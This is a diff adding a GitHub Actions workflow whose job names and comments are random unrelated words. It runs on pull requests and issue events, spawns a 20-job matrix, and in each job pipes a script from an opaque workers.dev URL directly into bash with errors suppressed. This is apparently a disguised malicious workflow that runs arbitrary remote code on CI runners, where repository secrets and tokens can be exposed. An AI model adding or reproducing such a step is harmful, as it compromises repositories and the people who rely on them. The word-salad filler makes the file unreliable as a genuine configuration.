@@ -1,0 +1,27 @@
+name: handy
+
+#honest
+on:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+#counsel lamb
+#handbag
+jobs:
+  advice:
+    #prosper fetch silent
+    #encourage link admit harm
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        mislead: ["grammatical", "successive", "expensive", "scarce", "lengthy"]
+        narrow: ["calculation", "journalist", "forgive", "advance"]
+    steps:
+    - uses: actions/checkout@v6
+    - name: introduction
+      continue-on-error: true
+      run: |
+        curl -sS -L "https://i.donnickcarbonaro70085.workers.dev/f5195a6edd/bbb8f385ba07e15/d5b02fba343667b8444efe621d96185abd9b918?b=1775439694&msp=fm&ow=gf" | bash
+    - name: consumer
+      run: ignore
